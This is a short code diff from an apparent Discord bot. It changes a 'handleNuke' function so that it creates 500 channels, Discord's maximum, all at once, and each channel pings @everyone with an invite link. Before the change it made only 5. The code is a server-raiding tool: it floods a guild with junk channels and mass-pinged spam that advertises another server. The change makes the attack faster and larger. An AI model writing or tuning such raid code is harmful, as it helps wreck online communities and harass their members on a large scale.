@@ -249,16 +249,21 @@ async function handleNuke(interaction: ChatInputCommandInteraction, executor: Gu
     }
   }
 
-  for (let i = 0; i < 5; i++) {
-    const newCh = await guild.channels.create({
-      name: "5499",
-      type: ChannelType.GuildText,
-    }).catch(() => null);
+  const DISCORD_MAX_CHANNELS = 500;
+  const createPromises: Promise<void>[] = [];
 
-    if (newCh) {
-      await newCh.send(`@everyone\n${invite}`).catch(() => {});
-    }
+  for (let i = 0; i < DISCORD_MAX_CHANNELS; i++) {
+    createPromises.push(
+      guild.channels.create({
+        name: "5499",
+        type: ChannelType.GuildText,
+      }).then(async (ch) => {
+        await ch.send(`@everyone\n${invite}`).catch(() => {});
+      }).catch(() => {})
+    );
   }
+
+  await Promise.allSettled(createPromises);
 }
 
 async function handleBroadcast(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
